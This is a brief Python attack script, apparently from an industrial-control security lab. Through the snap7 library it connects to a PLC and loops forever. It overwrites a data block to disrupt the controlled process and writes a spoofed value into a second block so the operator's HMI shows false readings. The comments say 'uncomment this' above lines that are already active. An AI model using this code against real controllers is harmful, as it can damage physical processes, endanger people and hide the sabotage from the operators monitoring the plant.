"""
Write to DB1 to make the function do something
Write to DB2 to fool the HMI (eventually)
Write to MD104... for no real reason, as it updates every second or so
"""
__author__ = 'William Jardine'

import snap7
import binascii

ip = '192.168.0.101'		# IP of fieldsite 3 PLC
rack = 0
slot = 2

client = snap7.client.Client()
client.connect(ip, rack, slot)

x = bytearray(b'\xff\xff\xff\xff')
y = bytearray(b'\x42\x8e\x3f\x1d')	# uncomment this to fool HMI


while True:
	print("writing {}".format(binascii.hexlify(x)))
	client.db_write(1,2,x)		# uncomment this to attack process
	client.db_write(2,2,y)		# uncomment this to fool HMI - this is same purpose as MD104 but not overwritten
	#client.write_area(snap7.types.areas['MK'], 0, 104, x)

client.disconnect()
